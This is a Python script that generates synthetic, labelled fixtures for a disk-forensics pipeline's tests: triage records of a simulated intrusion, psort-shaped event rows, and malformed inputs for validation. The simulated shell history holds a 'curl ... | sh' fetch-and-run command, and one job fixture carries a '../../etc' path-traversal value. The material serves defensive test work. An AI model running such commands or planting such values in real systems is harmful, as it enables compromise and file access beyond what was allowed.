# ruff: noqa: E501 - hand-written fixture records
"""Writes the `disk.v1` / `disk-export.v1` fixtures of this directory and the psort-shaped rows
of `../psort/` (M9 phase 1, frozen with the contract).

Every record below is hand-written, synthetic and labelled as such (`tool_versions.fixture`,
`timeline_engine: replay`; each psort file starts with a `__fixture__` comment row that the
reader skips): none of it comes from a real disk image, a real Plaso run or a real analysis
(requirement.txt §16). This script only serializes the records and computes the trailers
(line count + sha256 of every byte before the trailer line), so a fixture change is reviewed
here, never in the generated files.

    python packages/py-jobs/tests/fixtures/disk/build_fixtures.py   (pure Python, no deps)
"""

import copy
import hashlib
import json
from pathlib import Path
from typing import Any

HERE = Path(__file__).resolve().parent
HOSTILE = HERE / "hostile"
PSORT = HERE.parent / "psort"

WINDOWS_JOB = "7b2e1d2f-9e7c-4d66-8eaf-1e2c7a6b2001"
LINUX_JOB = "7b2e1d2f-9e7c-4d66-8eaf-1e2c7a6b2002"
EWF_JOB = "7b2e1d2f-9e7c-4d66-8eaf-1e2c7a6b2003"
NOFS_JOB = "7b2e1d2f-9e7c-4d66-8eaf-1e2c7a6b2004"
EXPORT_JOB = "7b2e1d2f-9e7c-4d66-8eaf-1e2c7a6b2005"
LABEL = "synthetic hand-written fixture (not a real image, not real analysis)"
VERSIONS = {
    "fixture": LABEL,
    "pytsk3": "20260715",
    "tsk": "4.15.0",
    "libewf": "20260924",
    "plaso": "20261027",
    "yara": "4.5.2",
}

Line = dict[str, Any]


def _ts(minute: int, second: int = 0, day: int = 1) -> str:
    return f"2026-10-{day:02d}T{8 + minute // 60:02d}:{minute % 60:02d}:{second:02d}Z"


def _hex(seed: str, n: int) -> str:
    return hashlib.sha256(seed.encode()).hexdigest()[:n] if n <= 64 else ""


def _stage(stage: str, status: str = "ok", part: int | None = None, **extra: Any) -> Line:
    row: Line = {"stage": stage, "status": status, "rows": 1, "truncated": False, "duration_ms": 1000, "audit_counts": {}}
    if part is not None:
        row["partition_index"] = part
    row.update(extra)
    return row


def _header(job: str, profile: str, image: Line, stages: list[Line], **extra: Any) -> Line:
    header: Line = {
        "kind": "header",
        "schema_version": "disk.v1",
        "job_id": job,
        "profile": profile,
        "engine": "tsk",
        "timeline_engine": "replay",
        "tool_versions": VERSIONS,
        "image": image,
        "hashsets": [],
        "stages": stages,
        "artifacts": [],
        "engine_errors": [],
        "truncated": {},
    }
    header.update(extra)
    return header


def _file(part: int, addr: int, path: str, *, parent: int, ftype: str = "reg", flags: int = 1, size: int = 1024, magic: str | None = "other", hashed: bool = True, minute: int = 0, **extra: Any) -> Line:
    name = path.rsplit("/", 1)[-1]
    ext = name.rsplit(".", 1)[-1].lower() if "." in name else None
    row: Line = {
        "kind": "file",
        "partition_index": part,
        "meta_addr": addr,
        "meta_seq": 1,
        "path": path,
        "parent_addr": parent,
        "name": name,
        "ext": ext,
        "type": ftype,
        "flags": flags,
        "size": size if ftype == "reg" else None,
        "mtime": _ts(minute),
        "atime": _ts(minute, 30),
        "ctime": _ts(minute),
        "crtime": _ts(max(minute - 1, 0)),
        "time_basis": "utc",
        "magic": magic if ftype == "reg" else None,
    }
    if hashed and ftype == "reg" and flags & 2 == 0:
        row.update(hash_status="hashed", md5=_hex(path + "md5", 32), sha1=_hex(path + "sha1", 40), sha256=_hex(path, 64))
    elif ftype == "reg":
        row["hash_status"] = "not_allocated" if flags & 2 else "too_large"
    else:
        row["hash_status"] = "not_regular"
    row.update(extra)
    return row


def _event(ordinal: int, artifact: str, parser: str, data_type: str, path: str, message: str, minute: int, part: int = 1, **attrs: Any) -> Line:
    return {
        "kind": "event",
        "ordinal": ordinal,
        "ts": _ts(minute),
        "ts_desc": "Creation Time" if artifact in ("evtx", "lnk") else "Last Written Time" if artifact.startswith("registry") else "Last Time Executed" if artifact == "prefetch" else "Content Modification Time",
        "artifact": artifact,
        "parser": parser,
        "data_type": data_type,
        "partition_index": part,
        "path": path,
        "message": message,
        "attributes": attrs,
    }


def _finding(fid: str, ftype: str, title: str, method: str, severity: str, minute: int, refs: list[str], **attrs: Any) -> Line:
    return {
        "kind": "finding",
        "finding_id": fid,
        "type": ftype,
        "title": title,
        "description": f"{title} (synthetic fixture finding: an observation, not a verdict)",
        "severity": severity,
        "confidence": 0.6,
        "detection_method": method,
        "ts": _ts(minute),
        "evidence_refs": refs,
        "attributes": attrs,
    }


def _ioc(itype: str, value: str, minute: int) -> Line:
    return {"kind": "ioc", "type": itype, "value": value, "first_seen": _ts(minute), "last_seen": _ts(minute), "count": 1, "source": "disk"}


def _timeline(event: str, title: str, minute: int, severity: str | None = None, ref: str | None = None) -> Line:
    row: Line = {"kind": "timeline", "ts": _ts(minute), "event": event, "title": title, "severity": severity, "ref": ref}
    return row


def _write(path: Path, lines: list[Line]) -> None:
    body = b"".join(json.dumps(line, separators=(",", ":"), ensure_ascii=False).encode() + b"\n" for line in lines)
    trailer = {"kind": "trailer", "line_count": len(lines), "sha256": hashlib.sha256(body).hexdigest()}
    path.write_bytes(body + json.dumps(trailer, separators=(",", ":")).encode() + b"\n")


def _write_raw(path: Path, lines: list[Line], *, extra_after: list[Line] | None = None) -> None:
    """Like `_write` but appends lines after the trailer (hostile)."""
    _write(path, lines)
    if extra_after:
        with path.open("ab") as fh:
            for line in extra_after:
                fh.write(json.dumps(line, separators=(",", ":")).encode() + b"\n")


# --- windows triage -------------------------------------------------------------------------

WIN_IMAGE = {"format": "raw", "segments": 1, "media_size": 67_108_864, "sector_size": 512, "media_sha256": "a" * 64}
WIN_PARTITIONS = [
    {"kind": "partition", "index": 0, "start_sector": 0, "length_sectors": 2048, "description": "Unallocated", "vs_flags": "unalloc", "fs_status": "undetermined", "os": "none", "counts": {}},
    {"kind": "partition", "index": 1, "start_sector": 2048, "length_sectors": 129024, "description": "NTFS / exFAT (0x07)", "vs_flags": "alloc", "fs_type": "ntfs", "fs_status": "ok", "fs_label": "Windows", "fs_uuid": "1A2B3C4D5E6F7081", "block_size": 4096, "os": "windows", "os_name": "Windows 10 Pro (synthetic)", "counts": {"files": 300, "deleted": 1, "orphans": 1}},
]


def windows_files() -> list[Line]:
    files: list[Line] = []
    addr = 64
    dirs = {"": 5}

    def ensure_dir(path: str) -> int:
        nonlocal addr
        if path in dirs:
            return dirs[path]
        parent_path = path.rsplit("/", 1)[0] if "/" in path else ""
        parent = ensure_dir(parent_path)
        addr += 1
        dirs[path] = addr
        files.append(_file(1, addr, path, parent=parent, ftype="dir"))
        return addr

    def add(path: str, **kw: Any) -> None:
        nonlocal addr
        parent = ensure_dir(path.rsplit("/", 1)[0]) if "/" in path else 5
        addr += 1
        files.append(_file(1, addr, path, parent=parent, **kw))

    for i in range(140):
        add(f"Windows/System32/sys{i:03d}.dll", magic="pe", size=40_960 + i, minute=1)
    for i in range(60):
        add(f"Windows/System32/winevt/Logs/Channel{i:02d}.evtx", magic="other", minute=2)
    add("Windows/System32/config/SYSTEM", magic="other", size=8_388_608)
    add("Windows/System32/config/SOFTWARE", magic="other", size=33_554_432)
    add("Windows/System32/config/SAM", magic="other", hashed=False, size=65_536)
    add("Windows/AppCompat/Programs/Amcache.hve", magic="other", size=1_048_576)
    for i in range(40):
        add(f"Windows/Prefetch/APP{i:02d}.EXE-1A2B3C4D.pf", magic="other", minute=3)
    for i in range(30):
        add(f"Users/alice/AppData/Roaming/Microsoft/Windows/Recent/doc{i:02d}.lnk", magic="other", minute=4)
    add("Users/alice/NTUSER.DAT", magic="other", size=2_097_152)
    add("Users/alice/AppData/Local/Temp/updater.exe", magic="pe", size=204_800, minute=50, yara_rules=["image.cyberlab_baseline.CyberLab_Suspicious_Packer"])
    add("Users/alice/Downloads/invoice.pdf.exe", magic="pe", size=102_400, minute=51)
    add("Users/alice/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/sync.lnk", magic="other", minute=52)
    add("Users/alice/Documents/report.docx", magic="document", size=20_480, minute=20, known="good", known_set="nsrl-minimal")
    # NTFS named stream with PE magic (an ADS)
    add("Users/alice/Documents/notes.txt", magic="pe", size=4_096, minute=53, stream="payload")
    # a deleted entry and an orphan
    add("Users/alice/Downloads/old_tool.exe", flags=2, magic=None, hashed=False, minute=10)
    addr += 1
    files.append(_file(1, addr, "$OrphanFiles/OrphanFile-9999", parent=5, flags=2 | 4, magic=None, hashed=False))
    # a hard-linked name pair (RT7): both names of one inode
    add("Users/alice/link_a.txt", flags=1 | 64, magic="other", minute=5)
    files.append({**files[-1], "path": "Users/alice/Documents/link_b.txt", "name": "link_b.txt", "parent_addr": dirs["Users/alice/Documents"]})
    return files


def windows_events() -> list[Line]:
    ev = [
        _event(0, "evtx", "winevtx", "windows:evtx:record", "Windows/System32/winevt/Logs/Security.evtx", "[4624 / 0x1210] Logon Type: 10 Account: alice Source: 203.0.113.50", 30, event_identifier=4624, logon_type=10, source_address="203.0.113.50"),
        _event(1, "evtx", "winevtx", "windows:evtx:record", "Windows/System32/winevt/Logs/Security.evtx", "[1102 / 0x044e] The audit log was cleared", 54, event_identifier=1102),
        _event(2, "evtx", "winevtx", "windows:evtx:record", "Windows/System32/winevt/Logs/System.evtx", "[7045 / 0x1b85] Service installed: updsvc ImagePath: C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", 55, event_identifier=7045),
        _event(3, "registry_user", "winreg/msie_zone", "windows:registry:key_value", "Users/alice/NTUSER.DAT", "[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] sync: C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", 52),
        _event(4, "registry_system", "winreg/windows_services", "windows:registry:service", "Windows/System32/config/SYSTEM", "[HKLM\\System\\ControlSet001\\Services\\updsvc] Start: 2 Type: 16", 55),
        _event(5, "prefetch", "prefetch", "windows:prefetch:execution", "Windows/Prefetch/UPDATER.EXE-1A2B3C4D.pf", "Prefetch [UPDATER.EXE] was executed - run count 3", 56, run_count=3),
        _event(6, "lnk", "lnk", "windows:lnk:link", "Users/alice/AppData/Roaming/Microsoft/Windows/Recent/doc00.lnk", "File size: 20480 Local path: C:\\Users\\alice\\Documents\\report.docx", 21),
        _event(7, "amcache", "amcache", "windows:registry:amcache", "Windows/AppCompat/Programs/Amcache.hve", "path: c:\\users\\alice\\appdata\\local\\temp\\updater.exe sha1: " + _hex("u", 40), 50),
    ]
    ev[5]["file"] = {"partition_index": 1, "meta_addr": 9999, "meta_seq": 1}
    return ev


def windows_triage() -> list[Line]:
    stages = [_stage("download"), _stage("layout"), _stage("walk", part=1, rows=301), _stage("collect", part=1), _stage("scan"), _stage("timeline", part=1, rows=8)]
    artifacts = [
        {"artifact": "evtx", "files": 60, "bytes": 69_206_016, "events_read": 3, "events_stored": 3},
        {"artifact": "registry_system", "files": 2, "bytes": 41_943_040, "events_read": 1, "events_stored": 1},
        {"artifact": "registry_user", "files": 1, "bytes": 2_097_152, "events_read": 1, "events_stored": 1},
        {"artifact": "amcache", "files": 1, "bytes": 1_048_576, "events_read": 1, "events_stored": 1},
        {"artifact": "prefetch", "files": 40, "bytes": 409_600, "events_read": 1, "events_stored": 1},
        {"artifact": "lnk", "files": 31, "bytes": 31_744, "events_read": 1, "events_stored": 1},
    ]
    hashsets = [{"name": "nsrl-minimal", "kind": "known_good", "count": 1000, "manifest_sha256": "d" * 64}]
    lines: list[Line] = [_header(WINDOWS_JOB, "triage", WIN_IMAGE, stages, artifacts=artifacts, hashsets=hashsets), *WIN_PARTITIONS, *windows_files(), *windows_events()]
    f1, f2, f3 = "8c1f2a3b-0000-4000-8000-000000000001", "8c1f2a3b-0000-4000-8000-000000000002", "8c1f2a3b-0000-4000-8000-000000000003"
    lines += [
        _finding(f1, "disk_exec_user_writable", "Executable in a user-writable path", "heuristic:disk_exec_user_writable@1", "medium", 50, ["file:1:Users/alice/AppData/Local/Temp/updater.exe"]),
        _finding(f2, "disk_log_cleared", "Security event log cleared", "heuristic:disk_log_cleared@1", "medium", 54, ["event:1"]),
        _finding(f3, "disk_double_extension", "File name with a double extension", "heuristic:disk_double_extension@1", "low", 51, ["file:1:Users/alice/Downloads/invoice.pdf.exe"]),
        _ioc("file_sha256", _hex("Users/alice/AppData/Local/Temp/updater.exe", 64), 50),
        _ioc("ip", "203.0.113.50", 30),
        _ioc("file_path", "C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", 50),
        _timeline("logon", "Remote logon (type 10) from 203.0.113.50", 30, "info", "event:0"),
        _timeline("finding", "Executable in a user-writable path", 50, "medium", f1),
        _timeline("log_cleared", "Security event log cleared", 54, "medium", f2),
        _timeline("service_install", "Service updsvc installed", 55, "info", "event:2"),
    ]
    return lines


# --- linux triage ---------------------------------------------------------------------------


def linux_triage() -> list[Line]:
    image = {"format": "split_raw", "segments": 2, "media_size": 33_554_432, "sector_size": 512, "media_sha256": "e" * 64}
    parts = [
        {"kind": "partition", "index": 0, "start_sector": 0, "length_sectors": 34, "description": "GPT Header", "vs_flags": "meta", "fs_status": "undetermined", "os": "none"},
        {"kind": "partition", "index": 1, "start_sector": 2048, "length_sectors": 63_488, "description": "Linux filesystem", "vs_flags": "alloc", "fs_type": "ext4", "fs_status": "ok", "fs_label": "root", "fs_uuid": "0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0", "block_size": 4096, "os": "linux", "os_name": "Debian GNU/Linux 13 (synthetic)", "counts": {"files": 12}},
    ]
    files: list[Line] = []
    for i, (path, parent, kw) in enumerate(
        [
            ("etc", 2, {"ftype": "dir"}),
            ("var", 2, {"ftype": "dir"}),
            ("var/log", 13, {"ftype": "dir"}),
            ("etc/hostname", 12, {}),
            ("etc/passwd", 12, {}),
            ("etc/shadow", 12, {"hashed": False, "mode": 0o100640}),
            ("var/log/syslog", 14, {}),
            ("var/log/auth.log", 14, {}),
            ("var/log/wtmp", 14, {}),
            ("root/.bash_history", 2, {}),
            ("tmp/.x/miner", 2, {"magic": "elf", "mode": 0o100755}),
            ("home/bob/.ssh/id_ed25519", 2, {"hashed": False}),
        ]
    ):
        files.append(_file(1, 12 + i, path, parent=parent, minute=i, uid=0, gid=0, **kw))
    events = [
        _event(0, "auth_log", "syslog", "syslog:line", "var/log/auth.log", "sshd[812]: Accepted password for root from 198.51.100.7 port 50122 ssh2", 40),
        _event(1, "shell_history", "bash_history", "bash:history:entry", "root/.bash_history", "Command executed: curl -s http://198.51.100.9/x.sh | sh", 41),
        _event(2, "syslog", "syslog", "syslog:line", "var/log/syslog", "CRON[901]: (root) CMD (/tmp/.x/miner)", 42),
        _event(3, "utmp", "utmp", "linux:utmp:event", "var/log/wtmp", "User: root Terminal: pts/0 Host: 198.51.100.7", 40),
    ]
    fid = "8c1f2a3b-0000-4000-8000-000000000011"
    stages = [_stage("download"), _stage("layout"), _stage("walk", part=1, rows=12), _stage("collect", part=1), _stage("scan", "skipped", reason="no_candidates"), _stage("timeline", part=1, rows=4)]
    return [
        _header(LINUX_JOB, "triage", image, stages),
        *parts,
        *files,
        *events,
        _finding(fid, "disk_remote_logon", "Remote logon accepted for root", "heuristic:disk_remote_logon@1", "low", 40, ["event:0"], src="198.51.100.7"),
        _ioc("ip", "198.51.100.7", 40),
        _ioc("url", "http://198.51.100.9/x.sh", 41),
        _timeline("logon", "Remote logon accepted for root from 198.51.100.7", 40, "low", fid),
    ]


# --- EWF stored-hash mismatch, diagnostic, export ---------------------------------------------


def ewf_mismatch() -> list[Line]:
    image = {"format": "ewf", "segments": 2, "media_size": 67_108_864, "sector_size": 512, "media_sha256": "f" * 64, "ewf": {"stored_md5": "0" * 32, "stored_sha1": None, "media_hash_status": "mismatch", "meta": {"case_number": "CASE-0001 (synthetic)", "examiner": "fixture", "notes": "<script>inert</script>"}}}
    stages = [_stage("download"), _stage("verify", rows=0), _stage("layout"), _stage("walk", part=0, rows=1)]
    part = {"kind": "partition", "index": 0, "start_sector": 0, "length_sectors": 131_072, "vs_flags": "none", "fs_type": "fat32", "fs_status": "ok", "fs_label": "USB", "block_size": 4096, "os": "none"}
    fid = "8c1f2a3b-0000-4000-8000-000000000021"
    return [
        _header(EWF_JOB, "triage", image, stages, timeline_engine="none"),
        part,
        _file(0, 3, "readme.txt", parent=2, time_basis="local_unknown"),
        _finding(fid, "ewf_media_hash", "The stored EWF media hash does not match the content", "integrity:ewf_media_hash@1", "medium", 0, ["image"]),
    ]


def no_supported_filesystem() -> list[Line]:
    image = {"format": "raw", "segments": 1, "media_size": 8_388_608, "sector_size": 512}
    stages = [_stage("download"), _stage("layout", rows=2), _stage("walk", "skipped", reason="no_filesystem")]
    return [
        _header(NOFS_JOB, "triage", image, stages, timeline_engine="none", engine_errors=["no_supported_filesystem"]),
        {"kind": "partition", "index": 0, "start_sector": 2048, "length_sectors": 8192, "description": "Linux (0x83)", "vs_flags": "alloc", "fs_status": "encrypted", "os": "none", "error_code": "unsupported_disk_format"},
        {"kind": "partition", "index": 1, "start_sector": 10240, "length_sectors": 6144, "description": "Basic data", "vs_flags": "alloc", "fs_status": "undetermined", "os": "none"},
    ]


def export_result() -> list[Line]:
    return [
        {
            "kind": "header",
            "schema_version": "disk-export.v1",
            "job_id": EXPORT_JOB,
            "tool_versions": VERSIONS,
            "files": [
                {"export_id": "9d2e3f4a-0000-4000-8000-000000000001", "status": "ok", "size": 204_800, "sha256": _hex("Users/alice/AppData/Local/Temp/updater.exe", 64)},
                {"export_id": "9d2e3f4a-0000-4000-8000-000000000002", "status": "failed", "error_code": "disk_export_not_allowed"},
            ],
        }
    ]


# --- hostile --------------------------------------------------------------------------------


def hostile() -> dict[str, tuple[list[Line], list[Line] | None]]:
    base = windows_triage()
    out: dict[str, tuple[list[Line], list[Line] | None]] = {}

    def mutate(name: str, index: int, change: dict[str, Any] | None = None, *, drop: str | None = None) -> None:
        lines = copy.deepcopy(base)
        if change:
            lines[index].update(change)
        if drop:
            del lines[index][drop]
        out[name] = (lines, None)

    file_i = next(i for i, line in enumerate(base) if line["kind"] == "file" and line.get("hash_status") == "hashed")
    event_i = next(i for i, line in enumerate(base) if line["kind"] == "event")
    lines = copy.deepcopy(base)
    lines[0]["job_id"] = LINUX_JOB
    out["wrong_job.ndjson"] = (lines, None)
    mutate("nul_char_path.ndjson", file_i, {"path": "Windows/sys\u0000tem.dll"})
    mutate("control_char_path.ndjson", file_i, {"path": "Windows/a\nb.dll"})
    mutate("overlong_path.ndjson", file_i, {"path": "/".join(["d" * 255] * 17)})
    mutate("attributes_33.ndjson", event_i, {"attributes": {f"k{i}": i for i in range(33)}})
    mutate("nested_attribute.ndjson", event_i, {"attributes": {"a": {"b": 1}}})
    mutate("float_attribute.ndjson", event_i, {"attributes": {"a": 1.5}})
    mutate("extra_field.ndjson", file_i, {"owner_sid": "S-1-5-18"})
    mutate("bad_hash_length.ndjson", file_i, {"sha256": "ab" * 31})
    mutate("uppercase_hash.ndjson", file_i, {"md5": "A" * 32})
    mutate("unknown_artifact.ndjson", event_i, {"artifact": "pagefile"})
    mutate("address_overflow.ndjson", file_i, {"meta_addr": 2**64})
    mutate("timestamp_1500.ndjson", file_i, {"mtime": "1500-01-01T00:00:00Z"})
    mutate("deleted_hashed.ndjson", file_i, {"flags": 2})
    mutate("flags_out_of_range.ndjson", file_i, {"flags": 128})
    mutate("verdict_severity.ndjson", next(i for i, line in enumerate(base) if line["kind"] == "finding"), {"severity": "malicious"})
    lines = copy.deepcopy(base)
    lines[0]["image"]["format"] = "ewf"
    out["ewf_without_details.ndjson"] = (lines, None)
    lines = copy.deepcopy(base)
    lines[0]["image"]["ewf"] = {"media_hash_status": "verified", "meta": {}}
    lines[0]["image"]["format"] = "ewf"
    out["media_hash_status_outside_enum.ndjson"] = (lines, None)
    lines = copy.deepcopy(base)
    lines[0]["timeline_engine"] = "volatility3"
    out["unknown_timeline_engine.ndjson"] = (lines, None)
    # NaN as a bare token (not JSON): written by hand below
    out["nan.ndjson"] = (copy.deepcopy(base), None)
    # a stream line after the trailer
    out["after_trailer.ndjson"] = (copy.deepcopy(base), [base[event_i]])
    # out of order: an event before the files
    lines = copy.deepcopy(base)
    ev = lines.pop(event_i)
    lines.insert(3, ev)
    out["out_of_order.ndjson"] = (lines, None)
    # a diagnostic stream with a file line
    diag = no_supported_filesystem()
    diag.append(_file(1, 99, "x.txt", parent=5))
    out["diagnostic_with_files.ndjson"] = (diag, None)
    return out


def hostile_jobs() -> dict[str, Line]:
    """Job messages that must be refused (JSON documents, not streams)."""
    seg = {"ordinal": 0, "evidence_id": "5a000000-0000-4000-8000-000000000001", "expected_sha256": "a" * 64, "size_bytes": 1024, "url": "http://minio:9000/evidence/x?sig=1"}
    seg1 = {**seg, "ordinal": 2, "evidence_id": "5a000000-0000-4000-8000-000000000002"}
    manifest_dotdot = {
        "version": 1,
        "sets": [
            {
                "name": "evil",
                "kind": "known_bad",
                "algorithms": ["sha256"],
                "files": [{"algo": "sha256", "path": "../../etc/sha256.bin", "sha256": "a" * 64, "count": 1}],
                "source_sha256": "b" * 64,
                "imported_at": "2026-10-01T00:00:00Z",
                "tool_version": "fixture",
            }
        ],
    }
    return {"segments_not_contiguous.json": {"segments": [seg, seg1]}, "manifest_dotdot.json": manifest_dotdot}


# --- psort json_line-shaped rows ------------------------------------------------------------

PSORT_NOTE = {"__fixture__": LABEL + "; shape per Plaso 20261027 output/shared_json (json_line), to be checked against the phase-3a recorded sample"}


def _psort(parser: str, data_type: str, filename: str, desc: str, message: str, ts_us: int, inode: int, **attrs: Any) -> Line:
    return {
        "__container_type__": "event",
        "__type__": "AttributeContainer",
        "data_type": data_type,
        "date_time": {"__class_name__": "Filetime", "__type__": "DateTimeValues", "timestamp": ts_us * 10 + 116_444_736_000_000_000},
        "display_name": f"OS:/mirror/p1/{filename}",
        "filename": f"/mirror/p1/{filename}",
        "inode": inode,
        "message": message,
        "parser": parser,
        "pathspec": {"__type__": "PathSpec", "type_indicator": "OS", "location": f"/mirror/p1/{filename}"},
        "timestamp": ts_us,
        "timestamp_desc": desc,
        **attrs,
    }


T = 1_790_000_000_000_000  # 2026-09-21 (microseconds)


def psort_rows() -> dict[str, list[Line]]:
    sec = "Windows/System32/winevt/Logs/Security.evtx"
    sys_ = "Windows/System32/winevt/Logs/System.evtx"
    ps = "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx"
    evtx = [
        _psort("winevtx", "windows:evtx:record", sec, "Creation Time", f"[{eid} / 0x{eid:04x}] {msg}", T + i * 60_000_000, 100 + i, event_identifier=eid, source_name=src, record_number=1000 + i, computer_name="WKS-01", strings=strings)
        for i, (eid, src, msg, strings) in enumerate(
            [
                (4624, "Microsoft-Windows-Security-Auditing", "An account was successfully logged on", ["S-1-0-0", "-", "alice", "WKS-01", "10", "203.0.113.50"]),
                (4625, "Microsoft-Windows-Security-Auditing", "An account failed to log on", ["S-1-0-0", "-", "admin", "WKS-01", "3", "203.0.113.51"]),
                (4720, "Microsoft-Windows-Security-Auditing", "A user account was created", ["svc_backup", "WKS-01"]),
                (4732, "Microsoft-Windows-Security-Auditing", "A member was added to a security-enabled local group", ["svc_backup", "Administrators"]),
                (1102, "Microsoft-Windows-Eventlog", "The audit log was cleared", ["alice"]),
            ]
        )
    ]
    evtx.append(_psort("winevtx", "windows:evtx:record", sys_, "Creation Time", "[7045 / 0x1b85] A service was installed in the system", T + 400_000_000, 120, event_identifier=7045, source_name="Service Control Manager", record_number=5001, computer_name="WKS-01", strings=["updsvc", "C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", "user mode service", "auto start"]))
    evtx.append(_psort("winevtx", "windows:evtx:record", sys_, "Creation Time", "[104 / 0x0068] The System log file was cleared", T + 460_000_000, 121, event_identifier=104, source_name="Microsoft-Windows-Eventlog", record_number=5002, computer_name="WKS-01", strings=["alice", "System"]))
    del ps
    winreg = [
        _psort("winreg/windows_run", "windows:registry:run", "Users/alice/NTUSER.DAT", "Last Written Time", "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] sync: C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", T + 500_000_000, 200, key_path="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", entries=["sync: C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe"]),
        _psort("winreg/windows_services", "windows:registry:service", "Windows/System32/config/SYSTEM", "Last Written Time", "[HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\updsvc] ImagePath: C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe Start: Auto Start Type: Service - Own Process", T + 400_000_000, 201, key_path="HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\updsvc", image_path="C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe", start_type=2, service_type=16),
        _psort("winreg/userassist", "windows:registry:userassist", "Users/alice/NTUSER.DAT", "Last Time Executed", "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist] Value name: C:\\Users\\alice\\Downloads\\invoice.pdf.exe Count: 2", T + 300_000_000, 202, value_name="C:\\Users\\alice\\Downloads\\invoice.pdf.exe", number_of_executions=2),
    ]
    amcache = [_psort("amcache", "windows:registry:amcache", "Windows/AppCompat/Programs/Amcache.hve", "Link Time", "path: c:\\users\\alice\\appdata\\local\\temp\\updater.exe sha1: " + "3" * 40, T + 350_000_000, 300, full_path="c:\\users\\alice\\appdata\\local\\temp\\updater.exe", sha1="3" * 40, product_name="Updater")]
    prefetch = [_psort("prefetch", "windows:prefetch:execution", "Windows/Prefetch/UPDATER.EXE-1A2B3C4D.pf", "Last Time Executed", "Prefetch [UPDATER.EXE] was executed - run count 3 path hints: \\USERS\\ALICE\\APPDATA\\LOCAL\\TEMP\\UPDATER.EXE", T + 410_000_000, 400, executable="UPDATER.EXE", run_count=3, path_hints=["\\USERS\\ALICE\\APPDATA\\LOCAL\\TEMP\\UPDATER.EXE"])]
    lnk = [_psort("lnk", "windows:lnk:link", "Users/alice/AppData/Roaming/Microsoft/Windows/Recent/report.docx.lnk", "Content Modification Time", "File size: 20480 File attribute flags: 0x00000020 Local path: C:\\Users\\alice\\Documents\\report.docx", T + 200_000_000, 500, local_path="C:\\Users\\alice\\Documents\\report.docx", file_size=20480)]
    mft = [_psort("mft", "fs:stat:ntfs", "$MFT", "Creation Time", "TSK:/Users/alice/AppData/Local/Temp/updater.exe File reference: 1234-1 Attribute name: $STANDARD_INFORMATION", T + 340_000_000, 0, file_reference=1234 | (1 << 48), attribute_type=16, name="updater.exe")]
    chrome = [_psort("sqlite/chrome_27_history", "chrome:history:page_visited", "Users/alice/AppData/Local/Google/Chrome/User Data/Default/History", "Last Visited Time", "http://198.51.100.9/updater.exe (updater.exe) [count: 1] Type: [LINK]", T + 330_000_000, 600, url="http://198.51.100.9/updater.exe", title="updater.exe", visit_count=1)]
    syslog = [_psort("syslog", "syslog:line", "var/log/syslog", "Content Modification Time", "[CRON, pid: 901] (root) CMD (/tmp/.x/miner)", T + 700_000_000, 700, hostname="srv-01", reporter="CRON", pid=901, body="(root) CMD (/tmp/.x/miner)"),
              _psort("syslog/ssh", "syslog:ssh:login", "var/log/auth.log", "Content Modification Time", "Successful login of user: root from 198.51.100.7:50122 using authentication method: password ssh pid: 812", T + 650_000_000, 701, hostname="srv-01", username="root", address="198.51.100.7", port=50122, authentication_method="password")]
    utmp = [_psort("utmp", "linux:utmp:event", "var/log/wtmp", "Start Time", "User: root Hostname: 198.51.100.7 Terminal: pts/0 PID: 812 Terminal identifier: 0 Status: USER_PROCESS IP Address: 198.51.100.7", T + 651_000_000, 702, username="root", hostname="198.51.100.7", terminal="pts/0", pid=812, type=7, ip_address="198.51.100.7")]
    bash = [_psort("bash_history", "bash:history:command", "root/.bash_history", "Last Time Executed", "Command executed: curl -s http://198.51.100.9/x.sh | sh", T + 660_000_000, 703, command="curl -s http://198.51.100.9/x.sh | sh")]
    return {"winevtx.jsonl": evtx, "winreg.jsonl": winreg, "amcache.jsonl": amcache, "prefetch.jsonl": prefetch, "lnk.jsonl": lnk, "mft.jsonl": mft, "chrome_history.jsonl": chrome, "syslog.jsonl": syslog, "utmp.jsonl": utmp, "bash_history.jsonl": bash}


def main() -> None:
    HOSTILE.mkdir(exist_ok=True)
    PSORT.mkdir(exist_ok=True)
    _write(HERE / "windows_triage.ndjson", windows_triage())
    _write(HERE / "linux_triage.ndjson", linux_triage())
    _write(HERE / "ewf_mismatch.ndjson", ewf_mismatch())
    _write(HERE / "no_supported_filesystem.ndjson", no_supported_filesystem())
    _write(HERE / "export_result.ndjson", export_result())
    for name, (lines, after) in hostile().items():
        _write_raw(HOSTILE / name, lines, extra_after=after)
    # NaN: replace the first event's ordinal with the bare token NaN (invalid JSON number)
    nan = (HOSTILE / "nan.ndjson").read_bytes().replace(b'"ordinal":0,', b'"ordinal":NaN,', 1)
    (HOSTILE / "nan.ndjson").write_bytes(nan)
    for name, doc in hostile_jobs().items():
        (HOSTILE / name).write_text(json.dumps(doc, indent=2) + "\n", encoding="utf-8")
    for name, rows in psort_rows().items():
        body = "".join(json.dumps(r, separators=(",", ":"), ensure_ascii=False) + "\n" for r in [PSORT_NOTE, *rows])
        (PSORT / name).write_text(body, encoding="utf-8")


if __name__ == "__main__":
    main()
